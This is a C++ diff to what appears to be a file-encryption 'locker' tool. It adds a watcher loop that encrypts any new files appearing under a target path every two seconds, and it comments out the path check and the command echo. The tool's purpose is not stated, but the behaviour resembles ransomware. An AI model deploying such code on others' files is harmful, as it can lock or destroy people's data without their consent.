@@ -1,4 +1,5 @@
 ﻿#include <chrono>
+#include <csignal>
 #include "filesystem/filesystem.h"
 #include "CommandParser.h"
 #include "global_parameters.h"
@@ -25,9 +26,9 @@ int main(int argc, char* argv[])
     if (!locker::GeneratePolicy(CryptInfo))
     { LOG_ERROR("Failed to Generate Policy."); goto exit; }
     
-    if(!path_operation(&psys)) goto exit;
+    //if(!path_operation(&psys)) goto exit;
 
-    if (!global::print_command_g()) goto exit;
+    //if (!global::print_command_g()) goto exit;
     start_time = std::chrono::high_resolution_clock::now();
 
     execute_operation(psys.drive_info, psys.data, CryptInfo, psys.f_count);
@@ -106,10 +107,36 @@ void deletefex_opretaion(CRYPT_INFO* CryptInfo, DRIVE_INFO* data)
     filesystem::delete_file_exst(data);
 }
 
+sig_atomic_t doneman = 1;
+void signal_handler(int)
+{
+    doneman = 0;
+}
+
+void watcher_operation(CRYPT_INFO* CryptInfo)
+{
+    PathSystem psys(GLOBAL_PATH.g_Path);
+    std::signal(SIGINT, signal_handler);
+    while(doneman)
+    {
+        std::this_thread::sleep_for(std::chrono::milliseconds(2000));
+        psys.start_local_search();
+        if(psys.f_count == 0)
+            continue;
+        
+        LIST_FOREACH(psys.data, psys.drive_info)
+        {
+            crypt_operation(CryptInfo, psys.data);
+            psys.drive_info->LIST_DELETE_HEAD();
+            --psys.f_count;
+        }
+    }
+}
+
 void execute_operation(LIST<DRIVE_INFO>* DriveInfo, PDRIVE_INFO data, CRYPT_INFO* CryptInfo, int f)
 {
     operation_func operation = NULL;
-
+    if(CommandParser::WATHCER) watcher_operation(CryptInfo);
     if(CommandParser::O_REWRITE) operation = rewrite_operation;
     else if(CommandParser::HASH_FILE) operation = hash_operation;
     else if(CommandParser::PIPELINE)
